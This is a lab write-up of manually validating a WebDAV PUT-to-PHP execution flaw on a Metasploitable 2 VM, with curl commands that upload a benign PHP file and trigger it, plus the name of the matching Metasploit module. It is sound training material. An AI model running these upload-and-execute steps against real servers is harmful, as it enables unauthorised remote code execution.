# MS2 — Manual WebDAV Validation

**Date:** 2026-08-14  
**Target:** Metasploitable 2  
**Target IP:** `192.168.89.128`  
**Lab type:** Isolated local VM lab  
**Duration:** ~1 hour

## Objective

Manually validate the WebDAV-to-PHP execution path that was previously exploited with Metasploit.

The goal was to understand the vulnerability mechanism rather than repeat the previous automated exploitation and privilege-escalation work.

## 1. WebDAV Discovery

Requested the capabilities of `/dav/`:

```bash
curl -i -X OPTIONS http://192.168.89.128/dav/
```

Important response information:

```text
HTTP/1.1 200 OK
Server: Apache/2.2.8 (Ubuntu) DAV/2
DAV: 1,2
MS-Author-Via: DAV
Allow: OPTIONS,GET,HEAD,POST,DELETE,TRACE,PROPFIND,PROPPATCH,COPY,MOVE,LOCK,UNLOCK
```

### Interpretation

- Apache is exposing WebDAV functionality.
- `DAV: 1,2` confirms WebDAV support.
- The `Allow` header advertised several HTTP/WebDAV methods.
- `PUT` was not listed in the `Allow` header, so actual behaviour was tested rather than assuming that the header completely described the endpoint.

## 2. Test Actual PUT Behaviour

Created a harmless local test file:

```bash
echo "MS2 WebDAV test" > /tmp/webdav-test.txt
```

Uploaded it:

```bash
curl -i -T /tmp/webdav-test.txt http://192.168.89.128/dav/webdav-test.txt
```

Result:

```text
201 Created
```

### Finding

The server accepted the `PUT` request and created the requested resource.

This demonstrated:

```text
PUT request
    ↓
WebDAV endpoint
    ↓
File creation
    ↓
201 Created
```

## 3. Validate PHP File Upload

Created a harmless PHP test:

```bash
printf '%s\n' '<?php echo "MS2 PHP TEST"; ?>' > /tmp/webdav-test.php
```

Uploaded it:

```bash
curl -i -T /tmp/webdav-test.php http://192.168.89.128/dav/webdav-test.php
```

Result:

```text
201 Created
```

This demonstrated that the endpoint accepted a PHP file through WebDAV.

## 4. Validate PHP Execution

Requested the uploaded PHP file:

```bash
curl -i http://192.168.89.128/dav/webdav-test.php
```

The response confirmed that the PHP test code was executed.

Therefore the complete vulnerable chain was demonstrated manually:

```text
WebDAV enabled
      ↓
PUT accepted
      ↓
Arbitrary file creation
      ↓
PHP file accepted
      ↓
PHP interpreted by the server
      ↓
Server-side code execution
```

## 5. Connection to Previous Metasploit Work

Previously, the following Metasploit module successfully exploited the same attack surface:

```text
exploit/multi/http/webdav_upload_php
```

The manual exercise clarified what the module was automating:

```text
Check target
    ↓
Upload PHP payload
    ↓
Trigger uploaded PHP
    ↓
Obtain code execution
    ↓
Reverse connection / Meterpreter
```

The previous session then continued into post-exploitation and SUID privilege escalation through the vulnerable SUID `nmap` binary. That privilege-escalation material is intentionally **not repeated here**.

## 6. Cleanup

Removed the test files from the MS2 WebDAV directory after validation.

No persistent test artefacts were intentionally left behind.

## Key Lessons

- An advertised HTTP/WebDAV capability should be tested rather than blindly trusted.
- `201 Created` is evidence that the server created the requested resource.
- Successful file upload alone does not prove code execution.
- A server-side file must also be interpreted/executed for the vulnerability to become remote code execution.
- Manual validation provides a better understanding of what automated exploitation frameworks are doing.
- Metasploit should be understood as automation built on underlying protocol behaviour, not as a substitute for understanding the vulnerability.

## Status

**Completed — WebDAV manual validation successful.**
